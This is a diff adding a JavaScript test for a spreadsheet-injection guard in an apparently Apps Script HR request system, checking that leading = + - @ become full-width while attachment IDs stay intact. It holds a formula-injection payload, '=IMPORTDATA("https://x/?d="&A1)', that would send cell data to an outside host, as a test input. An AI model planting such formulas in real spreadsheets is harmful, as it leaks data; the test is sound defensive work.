@@ -475,4 +475,23 @@ ok('LIFF_HANDLERS 有掛 mgr_req_void（包一層）', () => {
   const src = fs.readFileSync(ROOT + '/apps-script/Liff.gs', 'utf8');
   assert(/mgr_req_void: function \(b\) \{ return handleMgrReqVoid_\(b\); \}/.test(src));
 });
+ok('寫入防護（2026-10-29 審查）：= + - @ 開頭的文字寫進試算表前第一個字換全形；附件 ID 不動', () => {
+  const sb = makeEnv({});
+  const col = (r, k) => { const d = sb.__sheets.requests.data; return d[r][d[0].indexOf(k)]; };
+  const a = submit(sb, { kind: 'ot', date: '2026-10-11', start: '21:00', end: '22:30', reason: '=IMPORTDATA("https://x/?d="&A1)' });
+  assert(a.ok, JSON.stringify(a));
+  assert.strictEqual(col(1, 'reason'), '＝IMPORTDATA("https://x/?d="&A1)');
+  const t = submit(sb, { kind: 'trip', date: '2026-10-12', hours: 4, place: '+HYPERLINK("x")', why: '@盤點' });
+  assert(t.ok, JSON.stringify(t));
+  assert.strictEqual(col(2, 'reason'), '地點：+HYPERLINK("x")；事由：@盤點');   // 出差存成「地點：…」開頭，本來就不是公式
+  const b = submit(sb, { kind: 'leave', date: '2026-10-15', leave_type: '病假', hours: 8, reason: '看醫生', attach_id: '-abcdefghij_123' });
+  assert(b.ok, JSON.stringify(b));
+  const last = sb.__sheets.requests.data.length - 1;
+  assert.strictEqual(col(last, 'attach_id'), '-abcdefghij_123');   // 雲端硬碟 ID 可能 - 開頭，不能換
+  assert.strictEqual(col(last, 'reason'), '看醫生');                 // 一般文字不動
+  assert(sb.handleMgrReqDecide_({ mgr_key: 'MK', id: a.request.id, decision: 'reject', reason: '-SUM(1,2)' }).ok);
+  assert.strictEqual(col(1, 'reject_reason'), '－SUM(1,2)');      // 主管填的退回理由也過同一關（reqSetCells_）
+  assert.strictEqual(sb.reqSheetText_('  =1+1'), '  ＝1+1');
+  assert.strictEqual(sb.reqSheetText_(8), 8);
+});
 if (require.main === module) console.log(`\n${n} 項全部通過`);
